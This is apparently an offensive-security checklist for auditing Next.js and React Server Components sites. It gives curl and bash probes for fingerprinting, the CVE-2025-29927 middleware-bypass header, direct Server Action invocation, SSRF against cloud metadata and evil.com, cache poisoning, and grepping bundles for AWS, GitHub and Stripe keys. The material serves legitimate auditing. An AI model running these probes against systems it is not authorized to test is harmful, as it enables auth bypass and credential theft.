# Next.js / React Server Components Hunt Checklist

Systematic checklist for auditing targets built on Next.js, React Server Components (RSC), or any SSR framework using React Flight protocol. **Activate automatically when target uses Next.js.**

**Prerequisite:** Complete RECON (§0) to confirm Next.js usage before executing remaining sections.

**Reference CVEs:** React2Shell (CVE-2025-55182, CVSS 10.0), Middleware Bypass (CVE-2025-29927), Flight DoS (CVE-2025-55184, CVE-2025-67779)

---

## 0. DETECTION & RECON (5 min)

### 0.1 Detect Next.js

```bash
TARGET="https://{domain}"

# === Fingerprinting ===
# Check _next static assets
curl -sI "${TARGET}/_next/static/" | head -20
curl -s "${TARGET}" | grep -oE '/_next/static/[a-zA-Z0-9_-]+/' | head -5

# Check build manifest
curl -s "${TARGET}/_next/static/chunks/webpack-*.js" -o /dev/null -w "%{http_code}"

# Check __NEXT_DATA__ in page source
curl -s "${TARGET}" | grep -o '__NEXT_DATA__' | head -1

# Check x-powered-by header (often disabled but worth checking)
curl -sI "${TARGET}" | grep -i 'x-powered-by'

# Check _next/data for ISR/SSG
curl -sI "${TARGET}/_next/data/" | head -5

# RSC Flight payload detection
curl -s "${TARGET}" -H "RSC: 1" -H "Next-Router-State-Tree: %5B%22%22%5D" | head -20
# If response starts with 0: or contains $R/$F/$T chunks → RSC active
```

- [ ] **Framework confirmed**: Next.js detected (build manifest, __NEXT_DATA__, _next/ paths)
- [ ] **RSC active**: Flight protocol responses detected (RSC: 1 header returns chunked format)
- [ ] **Version identified**: Check build ID, error pages, or source maps for version info
- [ ] **Hosting identified**: Vercel (x-vercel-id), self-hosted (custom headers), Cloudflare, AWS

### 0.2 Version & Feature Detection

```bash
# Extract build ID
curl -s "${TARGET}" | grep -oE '"buildId":"[^"]*"' | head -1

# Check if App Router (RSC) or Pages Router
curl -s "${TARGET}" | grep -c '__NEXT_DATA__'  # Pages Router = present
curl -s "${TARGET}" -H "RSC: 1" | grep -c '\$'  # App Router = Flight chunks

# Check middleware existence
curl -sI "${TARGET}" | grep -i 'x-middleware-'

# Check if source maps exposed
curl -s "${TARGET}/_next/static/chunks/main-*.js.map" -o /dev/null -w "%{http_code}"

# Check Next.js debug endpoint (dev mode leak)
curl -s "${TARGET}/__nextjs_original-stack-frame" -o /dev/null -w "%{http_code}"
```

- [ ] **App Router vs Pages Router**: Determines which attack vectors apply
- [ ] **Source maps exposed**: If 200 → full source code available (critical info leak)
- [ ] **Debug endpoints**: If `__nextjs_original-stack-frame` returns non-404 → dev mode in production
- [ ] **Middleware present**: x-middleware-* headers indicate middleware pipeline

---

## 1. REACT2SHELL — FLIGHT PROTOCOL RCE (CVE-2025-55182)

**CVSS 10.0 | Unauthenticated RCE | CISA KEV | Active state-sponsored exploitation**

The most critical Next.js vulnerability. Crafted Flight protocol payloads achieve server-side code execution through unsafe deserialization in React Server Components.

### 1.1 Version Check

```bash
# Check if target is running vulnerable versions:
# react-server-dom-webpack < 19.0.1 (RCE)
# react-server-dom-webpack 19.0.1-19.0.2 (DoS via CVE-2025-55184)
# react-server-dom-webpack 19.0.3 (DoS via CVE-2025-67779)
# Fully patched: >= 19.0.4 / 19.1.5 / 19.2.4

# Next.js vulnerable versions:
# < 15.0.5, 15.1.x < 15.1.9, 15.2.x < 15.2.6, 15.3.x < 15.3.6
# 15.4.x < 15.4.8, 15.5.x < 15.5.7, 16.0.x < 16.0.7

# Extract version from build artifacts
curl -s "${TARGET}/_next/static/chunks/framework-*.js" | grep -oE 'React\s+v?[0-9]+\.[0-9]+\.[0-9]+' | head -3
curl -s "${TARGET}/_next/static/chunks/main-*.js" | grep -oE 'next/[0-9]+\.[0-9]+\.[0-9]+' | head -3
```

- [ ] **React version identified**: Check against vulnerable range (< 19.0.4)
- [ ] **Next.js version identified**: Check against vulnerable range
- [ ] **If vulnerable version detected → CRITICAL finding, stop and report**

### 1.2 Server Action Endpoint Detection

```bash
# Server Actions are POST endpoints that process Flight protocol payloads
# They use a specific Content-Type and Next-Action header

# Check if Server Actions are available
curl -s -X POST "${TARGET}" \
  -H "Content-Type: text/plain;charset=utf-8" \
  -H "Next-Action: test" \
  -H "RSC: 1" \
  -D- -o /dev/null | head -20

# Response with x-action-redirect or x-action-revalidated → Server Actions active
```

- [ ] **Server Actions endpoints found**: POST endpoints accepting Next-Action header
- [ ] **Flight protocol accepted**: Server processes RSC payloads (not just static)

### 1.3 Complete CVE Family Check

| CVE | Type | CVSS | Component | Fixed In |
|-----|------|------|-----------|----------|
| CVE-2025-55182 | **RCE** (React2Shell) | 10.0 | react-server-dom-* | 19.0.1, 19.1.2, 19.2.1 |
| CVE-2025-55184 | DoS (infinite loop) | 7.5 | react-server-dom-* | 19.0.3, 19.1.4, 19.2.3 |
| CVE-2025-55183 | Source code exposure | 5.3 | react-server-dom-* | 19.0.3, 19.1.4, 19.2.3 |
| CVE-2025-67779 | DoS (incomplete fix) | 8.7 | react-server-dom-* | 19.0.4, 19.1.5, 19.2.4 |
| CVE-2025-66478 | Next.js downstream RCE | 10.0 | Next.js | 15.0.5+ (merged into 55182) |

- [ ] **All CVEs in family checked**: Version cross-referenced against ALL, not just RCE
- [ ] **Ref exploit**: React2Shell Dec 2025 — unauthenticated RCE, CISA KEV, state-sponsored exploitation within 48h. Credit: Lachlan Davidson.

---

## 2. SERVER ACTIONS IDOR & ABUSE

Server Actions marked with `'use server'` are exposed as POST endpoints. Action IDs are deterministic hashes discoverable from JS bundles.

### 2.1 Action ID Discovery

```bash
# Extract Server Action IDs from client bundles
curl -s "${TARGET}/_next/static/chunks/app/layout-*.js" | grep -oE '[a-f0-9]{40}' | sort -u
curl -s "${TARGET}/_next/static/chunks/app/page-*.js" | grep -oE '[a-f0-9]{40}' | sort -u

# Alternative: search all chunks
for chunk in $(curl -s "${TARGET}" | grep -oE '/_next/static/chunks/[^"]+\.js' | head -30); do
  curl -s "${TARGET}${chunk}" | grep -oE '[a-f0-9]{40}' | sort -u
done

# Search for action registration patterns
curl -s "${TARGET}/_next/static/chunks/app/layout-*.js" | grep -oE 'createServerReference|registerServerReference|server_action' | head -5
```

- [ ] **Action IDs extracted**: List of 40-char hex hashes found in client bundles
- [ ] **Action function names mapped**: Correlate IDs to function names from source maps or variable names

### 2.2 Direct Action Invocation

```bash
ACTION_ID="<extracted_40char_hash>"

# Call Server Action directly (bypass UI validation)
curl -s -X POST "${TARGET}" \
  -H "Content-Type: text/plain;charset=utf-8" \
  -H "Next-Action: ${ACTION_ID}" \
  -H "RSC: 1" \
  -d '[{"userId":"admin"}]'

# Try with different argument shapes
curl -s -X POST "${TARGET}" \
  -H "Content-Type: text/plain;charset=utf-8" \
  -H "Next-Action: ${ACTION_ID}" \
  -H "RSC: 1" \
  -d '["targetArg1","targetArg2"]'
```

- [ ] **IDOR tested**: Can action be called with other users' identifiers?
- [ ] **Authorization check verified**: Does action validate caller identity server-side?
- [ ] **Input validation bypass**: Does bypassing client form send unexpected types/values?
- [ ] **Sensitive actions without auth**: Admin-like actions callable without session?

### 2.3 Closure Variable Leakage

```bash
# Server Actions using closures may serialize server-side variables into the client payload
# Look for encrypted_bound_args in network traffic or __next_f chunks

curl -s "${TARGET}" | grep -oE 'encrypted_bound_args|__next_f|createServerReference' | head -10

# If encryption key is weak or leaked, bound args (DB IDs, secrets) may be extractable
```

- [ ] **Closure serialization detected**: Server variables bound in client-accessible payloads
- [ ] **Encryption key exposure**: Check if NEXT_SERVER_ACTIONS_ENCRYPTION_KEY is in env/bundles

---

## 3. MIDDLEWARE BYPASS (CVE-2025-29927)

**Severity: CRITICAL | Auth bypass via single header**

### 3.1 x-middleware-subrequest Bypass

```bash
# CVE-2025-29927: Adding x-middleware-subrequest header skips middleware entirely
# Patched in Next.js 14.2.25, 15.2.3

# Test middleware bypass
curl -sI "${TARGET}/protected-route" \
  -H "x-middleware-subrequest: middleware"

curl -sI "${TARGET}/api/admin" \
  -H "x-middleware-subrequest: middleware"

# Compare with/without the header
curl -sI "${TARGET}/protected-route"
# vs
curl -sI "${TARGET}/protected-route" -H "x-middleware-subrequest: middleware"
# If status code changes (403→200, 302→200) → VULNERABLE
```

- [ ] **Bypass confirmed**: Protected route accessible with x-middleware-subrequest header
- [ ] **Version check**: Next.js < 14.2.25 or < 15.2.3 → vulnerable
- [ ] **Scope of bypass**: What auth/access control logic is in middleware? (session check, role check, rate limit)

### 3.2 Middleware Auth Dependency Audit

```bash
# Check what the middleware protects by examining route patterns
# If middleware handles ALL auth → bypass = full auth bypass

# Test common protected patterns
for path in /dashboard /admin /api/user /api/admin /settings /api/internal /api/protected; do
  normal=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}${path}")
  bypass=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}${path}" -H "x-middleware-subrequest: middleware")
  [ "$normal" != "$bypass" ] && echo "[BYPASS] $path: $normal → $bypass"
done
```

- [ ] **Auth routes enumerated**: All routes that change behavior with bypass header
- [ ] **Impact assessed**: Full auth bypass vs partial (only some routes affected)
- [ ] **Ref exploit**: CVE-2025-29927 (March 2025) — Next.js middleware completely skipped via header injection

---

## 4. ENVIRONMENT VARIABLE EXPOSURE

### 4.1 NEXT_PUBLIC_ Leak Audit

```bash
# NEXT_PUBLIC_ variables are bundled into client JS — scan for secrets
# Download all chunks and search

mkdir -p evidence/nextjs-bundles
for chunk in $(curl -s "${TARGET}" | grep -oE '/_next/static/chunks/[^"]+\.js'); do
  curl -s "${TARGET}${chunk}" >> evidence/nextjs-bundles/all-chunks.js
done

# Search for exposed secrets
grep -oEi 'NEXT_PUBLIC_[A-Z_]+' evidence/nextjs-bundles/all-chunks.js | sort -u
grep -oEi '(api[_-]?key|secret|token|password|credential|private[_-]?key)\s*[:=]\s*["\x27][^"\x27]+' evidence/nextjs-bundles/all-chunks.js
grep -oEi 'sk[-_][a-zA-Z0-9]{20,}' evidence/nextjs-bundles/all-chunks.js  # Stripe secret keys
grep -oEi 'AKIA[0-9A-Z]{16}' evidence/nextjs-bundles/all-chunks.js       # AWS access keys
grep -oEi 'ghp_[a-zA-Z0-9]{36}' evidence/nextjs-bundles/all-chunks.js    # GitHub PAT
grep -oEi 'xox[bpras]-[a-zA-Z0-9-]+' evidence/nextjs-bundles/all-chunks.js  # Slack tokens
```

- [ ] **NEXT_PUBLIC_ variables listed**: All client-exposed env vars documented
- [ ] **Secret in public var**: Any API key, secret, or credential in NEXT_PUBLIC_ prefixed var
- [ ] **Server-only var leaked**: Check if non-NEXT_PUBLIC_ vars appear in client bundles (build misconfiguration)

### 4.2 Server Environment Leakage

```bash
# Check if error pages leak server env
curl -s "${TARGET}/nonexistent-page-that-triggers-error" | grep -iE '(DATABASE_URL|SECRET|API_KEY|process\.env)' | head -5

# Check _next/data for SSR-leaked data
curl -s "${TARGET}/_next/data/" 2>/dev/null | grep -iE '(token|secret|key|password)' | head -5

# Check source maps for env references
if curl -s "${TARGET}/_next/static/chunks/main-*.js.map" -o /dev/null -w "%{http_code}" | grep -q 200; then
  echo "[CRITICAL] Source maps exposed — download and search for secrets"
fi
```

- [ ] **Error page secrets**: Server env vars leaked in error responses
- [ ] **SSR data props**: Server-side secrets passed to client via getServerSideProps/generateMetadata
- [ ] **Source maps**: Full server code exposed via .map files

---

## 5. SSRF VIA SERVER COMPONENTS

React Server Components execute `fetch()` on the server. User-controlled URLs in RSC = SSRF.

### 5.1 Parameter-Driven Fetch Detection

```bash
# Look for URL parameters that might feed into server-side fetch
# Common patterns: ?url=, ?redirect=, ?callback=, ?image=, ?proxy=, ?feed=

for param in url redirect callback image proxy feed link src href api endpoint webhook; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/?${param}=https://httpbin.org/get" 2>/dev/null)
  [ "$code" != "000" ] && echo "[SSRF-CANDIDATE] ?${param}= → $code"
done

# Test with internal targets
curl -s "${TARGET}/?url=http://169.254.169.254/latest/meta-data/" 2>/dev/null | head -5  # AWS IMDS
curl -s "${TARGET}/?url=http://127.0.0.1:3000/" 2>/dev/null | head -5                    # Local services
```

- [ ] **URL parameters tested**: All user-controllable URL inputs checked for SSRF
- [ ] **Internal network access**: Can reach 169.254.169.254, 127.0.0.1, or internal hostnames
- [ ] **Protocol smuggling**: Test file://, gopher://, dict:// schemes

### 5.2 Image Optimization SSRF

```bash
# Next.js Image Optimization can fetch external images server-side
# /_next/image?url=<attacker-controlled>&w=1920&q=75

# Test with external callback
curl -s "${TARGET}/_next/image?url=https://{your-canary-domain}/ssrf-test&w=1920&q=75" -o /dev/null -w "%{http_code}"

# Test with internal targets
curl -s "${TARGET}/_next/image?url=http://169.254.169.254/latest/meta-data/&w=1920&q=75" -o /dev/null
curl -s "${TARGET}/_next/image?url=http://127.0.0.1:3000/api/internal&w=1920&q=75" -o /dev/null

# Check if remotePatterns is misconfigured (allows any domain)
curl -s "${TARGET}/_next/image?url=http://evil.com/payload&w=100&q=75" -o /dev/null -w "%{http_code}"
```

- [ ] **Image optimization SSRF**: /_next/image endpoint fetches attacker-controlled URLs
- [ ] **remotePatterns bypass**: Wildcard or overly permissive patterns configured
- [ ] **Ref exploit**: Multiple Next.js SSRF via Image Optimization (2023-2025 advisories)

---

## 6. CACHE POISONING

### 6.1 CDN/ISR Cache Poisoning

```bash
# Next.js uses Cache-Control headers and x-nextjs-cache for ISR
# Check caching behavior

curl -sI "${TARGET}" | grep -iE '(cache-control|x-nextjs-cache|x-vercel-cache|cf-cache-status|age)'

# Test Host header poisoning
curl -s "${TARGET}" -H "Host: evil.com" -H "X-Forwarded-Host: evil.com" | grep -i 'evil.com'

# Test cache key manipulation
curl -sI "${TARGET}/?__nextLocale=en" | grep -i cache
curl -sI "${TARGET}" -H "x-forwarded-proto: http" | head -10

# Test X-Forwarded-Host injection in cached responses
curl -s "${TARGET}" -H "X-Forwarded-Host: evil.com" | grep -oE 'https?://evil\.com[^"]*' | head -5
```

- [ ] **Cache headers analyzed**: ISR enabled? CDN caching? What varies?
- [ ] **Host header injection**: X-Forwarded-Host reflected in cached response → cache poisoning
- [ ] **Cache key pollution**: Parameters that change response but not cache key

### 6.2 _next/data Manipulation

```bash
# ISR pages serve JSON via _next/data/{buildId}/path.json
BUILD_ID=$(curl -s "${TARGET}" | grep -oE '"buildId":"[^"]*"' | cut -d'"' -f4)

# Check if _next/data is cacheable and manipulable
curl -sI "${TARGET}/_next/data/${BUILD_ID}/index.json" | grep -iE '(cache|age|etag)'

# Test with different headers
curl -s "${TARGET}/_next/data/${BUILD_ID}/index.json" -H "X-Forwarded-Host: evil.com" | head -20
```

- [ ] **_next/data accessible**: JSON payloads for SSR/ISR pages exposed
- [ ] **Cache poisonable**: Host header injection in cached _next/data responses
- [ ] **Ref exploit**: CPDoS (Cache Poisoning DoS) via X-Forwarded-Host in SSR frameworks

---

## 7. ROUTE HANDLER & API ROUTE CONFUSION

### 7.1 route.ts vs page.ts Conflict

```bash
# In App Router, route.ts and page.ts can conflict at same path
# route.ts handles API-like requests, page.ts handles page renders
# Confusion leads to auth bypass if route.ts has different auth than page.ts

# Test same path with different Accept headers
curl -s "${TARGET}/dashboard" -H "Accept: text/html" -o /dev/null -w "%{http_code} (HTML)"
curl -s "${TARGET}/dashboard" -H "Accept: application/json" -o /dev/null -w "%{http_code} (JSON)"

# Test API routes without auth
for method in GET POST PUT DELETE PATCH; do
  curl -s -X $method "${TARGET}/api/users" -o /dev/null -w "%{http_code} $method\n"
done
```

- [ ] **Content-type confusion**: Same route returns different data based on Accept header
- [ ] **Method confusion**: Unexpected HTTP methods accepted on routes
- [ ] **Auth inconsistency**: Page requires auth but API route at same path doesn't

### 7.2 Parallel Route & Intercepting Route Abuse

```bash
# Parallel routes use @folder convention — check if slot rendering leaks data
# Intercepting routes use (.) (..) (...) conventions — test direct access

# Try direct navigation to intercepted routes
curl -s "${TARGET}/(.)modal" -o /dev/null -w "%{http_code}"
curl -s "${TARGET}/(..)modal" -o /dev/null -w "%{http_code}"

# Try accessing default.tsx content directly
curl -s "${TARGET}/default" -o /dev/null -w "%{http_code}"
```

- [ ] **Parallel route data leak**: Slot content accessible without parent layout auth
- [ ] **Intercepted routes bypass**: Direct URL access bypasses interception logic

---

## 8. REDIRECT & REWRITE ABUSE

### 8.1 Open Redirect via redirect()

```bash
# Server-side redirect() can be exploited if destination is user-controlled
# Test common redirect parameters

for param in redirect next returnTo callbackUrl from to dest destination url; do
  resp=$(curl -sI "${TARGET}/auth/login?${param}=https://evil.com" | grep -i 'location:')
  [ -n "$resp" ] && echo "[REDIRECT] ?${param}= → $resp"
done

# Test protocol-relative redirect
curl -sI "${TARGET}/auth/login?redirect=//evil.com" | grep -i location
curl -sI "${TARGET}/auth/login?redirect=///evil.com" | grep -i location
```

- [ ] **Open redirect found**: User-controlled redirect destination not validated
- [ ] **Protocol-relative bypass**: //evil.com accepted as redirect target

### 8.2 next.config.js Rewrite Exposure

```bash
# Check if rewrites expose internal services
# Common pattern: /api/:path* → http://internal-service/:path*

# Test for internal service proxy
curl -s "${TARGET}/api/internal-test" -D- | head -20
curl -s "${TARGET}/api/v1/health" -D- | head -20

# Check for rewrite headers that leak backend info
curl -sI "${TARGET}/api/" | grep -iE '(x-powered-by|server|via|x-forwarded)'
```

- [ ] **Internal service exposed**: Rewrites proxy to internal services without auth
- [ ] **Backend info leaked**: Response headers from proxied service visible

---

## 9. BUILD ARTIFACT & DATA EXPOSURE

### 9.1 Sensitive File Discovery

```bash
TARGET="https://{domain}"

# Next.js specific sensitive paths
for path in \
  /_next/static/chunks/app/layout.js \
  /_next/static/chunks/pages/_app.js \
  /_next/static/chunks/pages/_document.js \
  /next.config.js \
  /next.config.mjs \
  /.next/server/app/page.js \
  /.next/BUILD_ID \
  /.next/build-manifest.json \
  /.next/react-loadable-manifest.json \
  /.next/prerender-manifest.json \
  /.next/routes-manifest.json \
  /.next/server/pages-manifest.json \
  /.next/server/middleware-manifest.json \
  /.env \
  /.env.local \
  /.env.production \
  /.env.development; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "${TARGET}${path}" 2>/dev/null)
  [ "$code" != "000" ] && [ "$code" != "404" ] && echo "[EXPOSURE] $code $path"
done
```

- [ ] **Build manifests exposed**: routes-manifest.json reveals all routes
- [ ] **Prerender manifest**: Shows all statically generated pages and their revalidation config
- [ ] **Middleware manifest**: Reveals middleware configuration and protected routes
- [ ] **.env files accessible**: Direct access to environment files

### 9.2 Source Map Analysis

```bash
# If source maps are exposed, download and extract full source
# This reveals all server-side logic, API keys, database queries

# Find source maps
curl -s "${TARGET}" | grep -oE '/_next/static/chunks/[^"]+\.js' | while read chunk; do
  map_code=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}${chunk}.map")
  [ "$map_code" = "200" ] && echo "[SOURCEMAP] ${chunk}.map"
done
```

- [ ] **Source maps downloadable**: Full client/server source code exposed
- [ ] **Server code in maps**: Server Components or API routes included in source maps

---

## 10. NEXTJS-SPECIFIC GREP PATTERNS (Surface Scan)

Run these against downloaded JS bundles or source code:

```bash
SRC="evidence/nextjs-bundles/all-chunks.js"  # or cloned repo

# === Critical: Auth & Secrets ===
grep -nE 'NEXT_PUBLIC_(SECRET|KEY|TOKEN|PASSWORD|PRIVATE)' "$SRC"
grep -nE '(supabase|firebase|stripe|algolia|sendgrid|twilio)\.(secret|key|token)' "$SRC"
grep -nE 'process\.env\.(DATABASE|REDIS|MONGO|POSTGRES)' "$SRC"
grep -nE 'Bearer\s+[a-zA-Z0-9._-]{20,}' "$SRC"
grep -nE 'createServerReference|registerServerReference' "$SRC"  # Server Action registration
grep -nE '__next_f|self\.__next_f' "$SRC"  # Flight protocol chunks

# === High: Server Action Patterns ===
grep -nE "'use server'" "$SRC"
grep -nE 'Next-Action|x-action' "$SRC"
grep -nE 'encrypted_bound_args' "$SRC"
grep -nE 'createActionURL|getServerActionDispatcher' "$SRC"

# === Medium: Configuration & Routes ===
grep -nE 'middleware\.ts|middleware\.js' "$SRC"
grep -nE 'x-middleware-subrequest' "$SRC"
grep -nE 'unstable_cache|revalidatePath|revalidateTag' "$SRC"
grep -nE 'generateStaticParams|getStaticPaths|getServerSideProps' "$SRC"
grep -nE 'next\.config\.(js|mjs|ts)' "$SRC"
grep -nE 'remotePatterns|images\.domains' "$SRC"  # Image optimization config

# === Info: Architecture ===
grep -nE 'ServerComponent|ClientComponent|use client' "$SRC"
grep -nE 'redirect\(|permanentRedirect\(' "$SRC"
grep -nE 'NextResponse\.rewrite|NextResponse\.redirect' "$SRC"
grep -nE 'cookies\(\)|headers\(\)' "$SRC"  # Dynamic functions
grep -nE 'fetch\(' "$SRC" | grep -v 'node_modules'  # Server-side fetch (SSRF candidates)
```

- [ ] **Secrets in bundles**: API keys, tokens, or credentials in client JS
- [ ] **Server Action patterns**: Action registration, encryption, bound args
- [ ] **Configuration leaks**: Middleware config, rewrite rules, image domains
- [ ] **Architecture mapped**: RSC vs client components, dynamic vs static routes

---

## 11. WORKFLOW

```
Pour chaque target Next.js :

1. DETECTION (5 min)        → Section 0: Confirm Next.js, version, App vs Pages Router
2. REACT2SHELL CHECK (5 min) → Section 1: Version against CVE-2025-55182 family
                                 If vulnerable → STOP, report CRITICAL immediately
3. MIDDLEWARE BYPASS (10 min) → Section 3: CVE-2025-29927 x-middleware-subrequest
4. SURFACE SCAN (15 min)     → Section 10: Grep patterns on downloaded bundles
5. ENV EXPOSURE (10 min)     → Section 4: NEXT_PUBLIC_ audit, source maps, .env files
6. BUILD ARTIFACTS (10 min)  → Section 9: Manifests, source maps, debug endpoints
7. SERVER ACTIONS (30 min)   → Section 2: Action ID extraction, IDOR, direct invocation
8. SSRF (20 min)             → Section 5: Server Component fetch, Image Optimization
9. CACHE POISONING (15 min)  → Section 6: CDN/ISR poisoning, Host header injection
10. ROUTE CONFUSION (15 min) → Section 7-8: route.ts/page.ts, redirects, rewrites
11. KILL GATE (30 min/finding) → KILL-GATE-TEMPLATE.md
12. DEEP DIVE (2-4h)         → Combine with WEB-API-CHECKLIST.md W1-W6
13. PREFLIGHT (15 min)       → PREFLIGHT-CHECK.md (min 22/24)
```

**Priority order:** React2Shell (existential) → Middleware Bypass (auth bypass) → Server Actions IDOR → Env Exposure → Everything else

---

## 12. REFERENCE EXPLOITS & CVES

| Date | CVE | Type | Impact | CVSS | Component |
|------|-----|------|--------|------|-----------|
| Dec 2025 | CVE-2025-55182 | RCE (React2Shell) | Unauthenticated server code execution | 10.0 | react-server-dom-* |
| Dec 2025 | CVE-2025-66478 | RCE (Next.js downstream) | Same as above via Next.js | 10.0 | Next.js |
| Dec 2025 | CVE-2025-55184 | DoS | Infinite loop server hang | 7.5 | react-server-dom-* |
| Dec 2025 | CVE-2025-55183 | Info leak | Server source code exposure | 5.3 | react-server-dom-* |
| Dec 2025 | CVE-2025-67779 | DoS | Incomplete fix for 55184 | 8.7 | react-server-dom-* |
| Mar 2025 | CVE-2025-29927 | Auth bypass | Middleware completely skipped | 9.1 | Next.js |
| Jan 2026 | CVE-2026-23864 | DoS | Flight protocol parsing | 7.5 | react-server-dom-* |
| 2024 | CVE-2024-34351 | SSRF | Image Optimization fetch | 7.5 | Next.js |
| 2024 | CVE-2024-46982 | Cache poison | ISR cache manipulation | 7.5 | Next.js |
| 2023 | CVE-2023-46298 | DoS | RSC payload crash | 5.3 | Next.js |

---

## 13. TOOLING

```bash
# === Automated Next.js scanning ===
# nuclei templates (if available)
nuclei -u "${TARGET}" -t cves/CVE-2025-29927.yaml -t cves/CVE-2025-55182.yaml

# === Manual tools ===
# Download all JS bundles
wget -r -l 1 -nd -P evidence/nextjs-bundles/ -A "*.js" "${TARGET}/_next/static/chunks/" 2>/dev/null

# Extract routes from build manifest
curl -s "${TARGET}/_next/static/$(curl -s ${TARGET} | grep -oE '"buildId":"[^"]*"' | cut -d'"' -f4)/_buildManifest.js" | \
  grep -oE '"[/][^"]*"' | sort -u

# Source map extractor (if maps exposed)
# npm install -g source-map-explorer
# source-map-explorer evidence/nextjs-bundles/main-*.js
```
